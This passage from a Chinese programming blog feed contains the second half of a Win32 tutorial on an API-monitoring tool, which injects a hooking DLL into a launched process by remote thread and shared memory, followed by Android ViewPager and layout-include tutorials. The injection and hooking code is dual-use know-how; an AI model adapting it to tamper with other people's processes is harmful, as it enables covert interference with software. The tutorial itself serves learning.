<p>首先先是判断我们是否有加载或者没有加载这个模块，主要是通过传过来的第二个BOOL类型的值判断，然后我们获取函数的地址。然后我们申请一小块内存用来存放我们的加载模块的全路径，然后调用远程线程去执行这个函数，等待我们的线程执行完毕然后关掉我们的句柄。</p>
<h2 id="内存共享"><a href="#内存共享" class="headerlink" title="内存共享"></a>内存共享</h2><p>因为我们需要传递我们的DLL注入，所以我们需要现在内存中共享一下我们的API函数和模块名。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __APISPYLIB_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __APISPYLIB_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CShareMemory.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  SHAREMEM <span class="meta-string">"APISpyLib"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  HM_SPYACALL WM_USER+102</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CAPISpyData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> szModName[<span class="number">256</span>];</span><br><span class="line">	<span class="keyword">char</span> szFuncName[<span class="number">256</span>];</span><br><span class="line">	HWND hWndCaller;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CMyShareMem</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CMyShareMem(BOOL bSever = FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		m_pMem = <span class="keyword">new</span> CShareMemory(SHAREMEM,<span class="keyword">sizeof</span>(CAPISpyData),bSever);</span><br><span class="line">		m_pData = (CAPISpyData*)(m_pMem-&gt;GetBuffer());</span><br><span class="line">		<span class="keyword">if</span>(m_pData == <span class="literal">NULL</span>)</span><br><span class="line">			ExitProcess(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	~CMyShareMem()&#123;<span class="keyword">delete</span> m_pMem;&#125;</span><br><span class="line">	<span class="function">CAPISpyData* <span class="title">GetData</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;<span class="keyword">return</span> m_pData;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	CAPISpyData* m_pData;</span><br><span class="line">	CShareMemory* m_pMem;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">//__APISPYLIB_H_</span></span></span><br></pre></td></tr></table></figure>
<p>我们包含之前写的内存共享类（内存映射），然后用一个结构体来保存我们的关键内容，模块名，函数名和窗口句柄。构造函数也就是初始化一下内存共享类，然后将我们的结构放在我们共享内存的位置。</p>
<h2 id="DLL编写"><a href="#DLL编写" class="headerlink" title="DLL编写"></a>DLL编写</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// APISpyLib.cpp : 定义 DLL 应用程序的导出函数。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CMyShareMem.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CAPIHook.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HookProc</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">CMyShareMem <span class="title">g_shareData</span><span class="params">(FALSE)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">CAPIHook <span class="title">g_orgFun</span><span class="params">(g_shareData.GetData()-&gt;szModName,g_shareData.GetData()-&gt;szFuncName,(PROC)HookProc)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NotifyCaller</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">CMyShareMem <span class="title">mem</span><span class="params">(FALSE)</span></span>;</span><br><span class="line">	SendMessage(mem.GetData()-&gt;hWndCaller,HM_SPYACALL,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__declspec(naked)<span class="function"><span class="keyword">void</span> <span class="title">HookProc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NotifyCaller();</span><br><span class="line"></span><br><span class="line">	DWORD dwOrgAddr;<span class="comment">//不可以直接赋值</span></span><br><span class="line">	dwOrgAddr = (DWORD)PROC(g_orgFun);</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax,dwOrgAddr</span><br><span class="line">		jmp eax</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>理解起来不是很难，我们先构造内存共享，只不过我们这边是接收端，还有我们APIHook类，这之前博客说过了。然后定义一个通知函数，用来通知窗口我们调用了，在我们替换的函数中，因为我们不确定API函数是什么样子的堆栈结构，所以我们这里用naked函数调用，也就是不进行堆栈平衡的调节。，这个函数最关键的一步就是先发送信息，然后我们获取我们原先函数的位置，PROC这个操作符我们在CAPIHook类已经定义过了，获取之后跳转过去就好，这里我们先要通过EAX做间接变量（我记得VS编译器不能call和jmp一个内存地址，只能这么中转）。</p>
<h2 id="主程序编写"><a href="#主程序编写" class="headerlink" title="主程序编写"></a>主程序编写</h2><p>初始化对话框的时候：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">TCHAR strName[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">GetModuleFileName(<span class="literal">NULL</span>,strName,<span class="number">256</span>);</span><br><span class="line">CString FullPath;</span><br><span class="line">FullPath.Format(<span class="string">"%s"</span>,strName);</span><br><span class="line">FullPath = FullPath.Left(FullPath.ReverseFind(<span class="string">'\\'</span>));</span><br><span class="line"></span><br><span class="line">m_pInjector = <span class="keyword">new</span> CRemThreadInjector(FullPath+<span class="string">"\\APISpyLib.dll"</span>);</span><br><span class="line">m_pShareMem = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>也就是先获取当前运行的目录，然后和我们的DLL进行拼接（测试的时候可以直接输入文件路径）。<br>然后初始换我们的成员变量。</p>
<p>消息接收</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">afx_msg LRESULT CAPISpyEXEDlg::OnHmSpyacall(WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">	MessageBox(<span class="string">"检测用到这个函数了！！！"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们直接弹出一个信息框就好了。</p>
<p>开始监视按钮：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CAPISpyEXEDlg::OnBnClickedOnstart()</span><br><span class="line">&#123;</span><br><span class="line">	CString strTargetApp;</span><br><span class="line">	GetDlgItem(IDC_TARGETAPP)-&gt;GetWindowText(strTargetApp);</span><br><span class="line">	<span class="keyword">if</span> (strTargetApp.IsEmpty())</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="string">"请输入目标程序"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CString strAPIName,strDllName;</span><br><span class="line">	GetDlgItem(IDC_APINAME)-&gt;GetWindowText(strAPIName);</span><br><span class="line">	GetDlgItem(IDC_DLLNAME)-&gt;GetWindowText(strDllName);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strAPIName.IsEmpty() || strDllName.IsEmpty())</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="string">"请输入要侦查的文件名"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HMODULE hdll = ::LoadLibrary(strDllName);</span><br><span class="line">	<span class="keyword">if</span> (GetProcAddress(hdll,strAPIName) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="string">"这个API不在这个模块里啊"</span>);</span><br><span class="line">		<span class="keyword">if</span>(hdll != <span class="literal">NULL</span>)</span><br><span class="line">			FreeLibrary(hdll);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	FreeLibrary(hdll);</span><br><span class="line"></span><br><span class="line">	m_pShareMem = <span class="keyword">new</span> CMyShareMem(TRUE);</span><br><span class="line">	m_pShareMem-&gt;GetData()-&gt;hWndCaller = m_hWnd;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strncpy</span>(m_pShareMem-&gt;GetData()-&gt;szFuncName,strAPIName,<span class="number">56</span>);</span><br><span class="line">	<span class="built_in">strncpy</span>(m_pShareMem-&gt;GetData()-&gt;szModName,strDllName,<span class="number">56</span>);</span><br><span class="line"></span><br><span class="line">	STARTUPINFO si = &#123;<span class="keyword">sizeof</span>(si)&#125;;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line">	BOOL bOk = CreateProcess(<span class="literal">NULL</span>,strTargetApp.GetBuffer(<span class="number">0</span>),<span class="literal">NULL</span>,<span class="literal">NULL</span>,FALSE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;si,&amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (bOk)</span><br><span class="line">	&#123;</span><br><span class="line">		bOk = m_pInjector-&gt;InjectModuleInto(pi.dwProcessId);</span><br><span class="line">		<span class="keyword">if</span>(!bOk)</span><br><span class="line">			MessageBox(<span class="string">"DLL注入失败"</span>);</span><br><span class="line">		CloseHandle(pi.hThread);		<span class="comment">//</span></span><br><span class="line">		CloseHandle(pi.hProcess);		<span class="comment">//这两个东西必须关掉，否则内核计数不会减为0的</span></span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="string">"启动目标进程失败"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!bOk)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">delete</span> m_pShareMem;</span><br><span class="line">		m_pShareMem = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们先检查是否有输入，然后判断是否在这个DLL中有指定的API，然后再释放。初始化我们的内存共享类，我们这边是发送端，所以我们要初始化我们的结构体信息，然后启动我们的指定用程序，启动成功之后我们就立马注入我们的DLL，然后关闭句柄简单的盘一下就好了。需要注意的是我们需要关掉我们启动时候的句柄，否则程序就算关闭也不会完全消失，因为内核对象还在内存中。</p>
<p><img src="img1.jpg" alt="效果图"></p>
<p>这里可以看到是我们的信息框先出来，我们关闭的时候才会弹出他的信息框，因为DLL那边在等我们的消息返回值。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Android ViewPager</title>
    <url>/2020/02/10/Android-ViewPager/</url>
    <content><![CDATA[<h2 id="ViewPager"><a href="#ViewPager" class="headerlink" title="ViewPager"></a>ViewPager</h2><p>一个引导页面，就比如我们一进入一个APP，第一次打开，他会告诉我们程序的各种使用方法，这个ViewPager就是这个东西。</p>
<h3 id="导入android-support-v4-jar包"><a href="#导入android-support-v4-jar包" class="headerlink" title="导入android-support-v4.jar包"></a>导入android-support-v4.jar包</h3><p>因为低版本无法支持这个引导页，所以我们一般需要引入一个Android4.0以上版本的一个jar包，路径一般是：<em>android-sdk_r24.4.1-windows\android-sdk-windows\extras\google\play_billing\samples\TrivialDrive\libs</em>。<br>操作过程就是先建一个Folder（文件夹），然后导入我们的包，托文件进来就好了，然后，右键这个包找到Build Path-&gt;Add…添加进来就可以了。</p>
<h3 id="组件的配置。"><a href="#组件的配置。" class="headerlink" title="组件的配置。"></a>组件的配置。</h3><p>导入组件之后，我们布局一下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FrameLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">android.support.v4.view.ViewPager</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/viewpager"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">android.support.v4.view.ViewPager</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/Lly"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">"bottom|center_horizontal"</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>            </span></span><br><span class="line"><span class="tag">            <span class="attr">android:src</span>=<span class="string">"@drawable/ic_point1"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:padding</span>=<span class="string">"15dip"</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>            </span></span><br><span class="line"><span class="tag">            <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:padding</span>=<span class="string">"15dip"</span></span></span><br><span class="line"><span class="tag">            /&gt;</span>        </span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>            </span></span><br><span class="line"><span class="tag">            <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:padding</span>=<span class="string">"15dip"</span></span></span><br><span class="line"><span class="tag">            /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">FrameLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意，要是用全类名：<code>android.support.v4.view.ViewPager</code>,属性啥的没啥注意的，我们在下面添加几个图片控件。</p>
<p>之后我们再编写java代码。</p>
<h3 id="初始化代码"><a href="#初始化代码" class="headerlink" title="初始化代码"></a>初始化代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ViewPager viewpager;</span><br><span class="line"><span class="keyword">private</span> List&lt;View&gt; viewList;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] imagesArr = &#123;R.drawable.ic_launcher,R.drawable.ic_launcher,R.drawable.ic_launcher&#125;;</span><br><span class="line"><span class="keyword">private</span> ImageView[] PointArr;</span><br><span class="line"><span class="keyword">private</span> ViewAdapterPager VpA;</span><br><span class="line"><span class="keyword">private</span> LinearLayout Lly;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> currentPoint;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">	setContentView(R.layout.activity_main);</span><br><span class="line">	initView();</span><br><span class="line">	initData();</span><br><span class="line">	initPoint();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>ViewPager就是我们的控件</li>
<li>viewList就是我们存储ViewPager中存放的图片的。</li>
<li>int数组存放的就是我们图片资源ID</li>
<li>PointArr，存放的是我们在下方展示的那几个ImageView，为的是告诉用户你当前到第几页了。</li>
<li>VpA就是我们的适配器，类使我们自己写的，集成别的类，下面会提到。</li>
<li>Lly我们的LinearLayout布局。</li>
<li>currentPoint当前选中的页面</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initView</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Lly = (LinearLayout) findViewById(R.id.Lly);</span><br><span class="line">	viewpager = (ViewPager) findViewById(R.id.viewpager);</span><br><span class="line">	viewList = <span class="keyword">new</span> ArrayList&lt;View&gt;();</span><br><span class="line">	VpA = <span class="keyword">new</span> ViewAdapterPager(viewList);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们在初始换视图的时候我们就是简单的new和find一下我们的控件和集合。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initData</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LayoutParams lP = <span class="keyword">new</span> LayoutParams(LayoutParams.MATCH_PARENT,LayoutParams.MATCH_PARENT);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i : imagesArr) &#123;</span><br><span class="line">		ImageView image = <span class="keyword">new</span> ImageView(<span class="keyword">this</span>);</span><br><span class="line">		image.setImageResource(i);</span><br><span class="line">		image.setLayoutParams(lP);</span><br><span class="line">		viewList.add(image);</span><br><span class="line">	&#125;</span><br><span class="line">	viewpager.setAdapter(VpA);</span><br><span class="line">	viewpager.setOnPageChangeListener(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在初始化数据的时候，我们就创建我们的图片资源，然后设置他填充父窗体，然后加入我们的List集合中，然后设置ViewPager的适配器，再设置页面改变的一个监听器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_study8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v4.view.PagerAdapter;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.view.ViewPager;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewAdapterPager</span> <span class="keyword">extends</span> <span class="title">PagerAdapter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> List&lt;View&gt; views;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ViewAdapterPager</span><span class="params">(List&lt;View&gt; views)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.views = views;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> views.size();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 初始化界面的</span></span><br><span class="line"><span class="comment">	 * */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">instantiateItem</span><span class="params">(View container, <span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">		((ViewPager)container).addView(views.get(position));</span><br><span class="line">		<span class="keyword">return</span> views.get(position);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 判断是否是对象生成的页面</span></span><br><span class="line"><span class="comment">	 * */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isViewFromObject</span><span class="params">(View arg0, Object arg1)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> arg0 == arg1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 销毁position位置的页面的</span></span><br><span class="line"><span class="comment">	 * */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroyItem</span><span class="params">(View container, <span class="keyword">int</span> position, Object object)</span> </span>&#123;</span><br><span class="line">		((ViewPager)container).removeView(views.get(position));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们自己写的这个类需要说一下，构造方法中，我们需要传入我们的那个ImageView控件的集合，<code>getCount</code>必须重写，返回页面个数。<code>instantiateItem</code>这个方法就是来要我们的控件的，在这个时候我们需要将我们控件先添加到我们的<code>container</code>也就是ViewPager中，然后返回给他这个ImageView控件。<code>isViewFromObject</code>方法就是判断是不是对象生成的页面，返回判断两者是否相等就好了。<code>destroyItem</code>方法就是和<code>instantiateItem</code>相对的，只不过没返回值，我们需要删除图片，在学习的过程中，发现内存中最多有三个图片，最少有两个。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initPoint</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PointArr = <span class="keyword">new</span> ImageView[imagesArr.length];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Lly.getChildCount(); i++) &#123;</span><br><span class="line">		PointArr[i] = (ImageView) Lly.getChildAt(i);</span><br><span class="line">		PointArr[i].setImageResource(R.drawable.ic_launcher);</span><br><span class="line">		PointArr[i].setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">		PointArr[i].setTag(i);</span><br><span class="line">	&#125;</span><br><span class="line">	currentPoint = <span class="number">0</span>;</span><br><span class="line">	PointArr[currentPoint].setImageResource(R.drawable.ic_point1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是初始化我们下面那几个点的，而且增加了点击事件，增加了控件的Tag标签，然后初始化这几个点的图片。</p>
<p>我们的类需要实现：<code>implements OnPageChangeListener,OnClickListener</code>。<br>有几个方法我们需要用到。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPageSelected</span><span class="params">(<span class="keyword">int</span> arg0)</span> </span>&#123;</span><br><span class="line">	setCurrentPoint(arg0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setCurrentPoint</span><span class="params">(<span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PointArr.length; i++) &#123;</span><br><span class="line">		PointArr[i].setImageResource(R.drawable.ic_launcher);</span><br><span class="line">	&#125;</span><br><span class="line">	PointArr[position].setImageResource(R.drawable.ic_point1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>onPageSelected</code>这个方法就是我们切换页面的时候用到的，传进来的其实是个当前页面下标，我们自定义一个函数来设置底部图片的。首先现将我们的所有图片设置为不是当前页，然后设置当前页为当前页，如果不设置其他的不是当前页，将会导致之后划完全都是当前页。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = (Integer)v.getTag();</span><br><span class="line">	viewpager.setCurrentItem(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是当我们点击图片的时候，通过传进来的控件取得控件Tag，我们之前设置好的，和图片页面一一对应的，取得之后设置当前页面就好了。</p>
<p><img src="img1.gif" alt="实现效果"></p>
<p>由于我懒得找图，这样看看效果就好了。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android静态和动态加载布局</title>
    <url>/2020/02/09/Android%E9%9D%99%E6%80%81%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h2 id="静态加载布局"><a href="#静态加载布局" class="headerlink" title="静态加载布局"></a>静态加载布局</h2><p>这个就是说，我们有的时候想要复用某个布局里面的内容，就比如说标题啊，结尾啊，这个就像是node.js，foot.js这种感觉，所以我们就要用到include。<br>include和C++的感觉也有点像，就是包含的这个头。<br>title.xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/textView2"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"标题"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/textView1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"内容"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们先写一个title的xml，然后我们在里面设计好我们的内容。<br>之后如果我们想要再次用到的话呢，我们可以直接包含：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">layout</span>=<span class="string">"@layout/title"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span><span class="comment">&lt;!-- 静态加载布局，也可以导控件，控件需要是单独的布局文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span 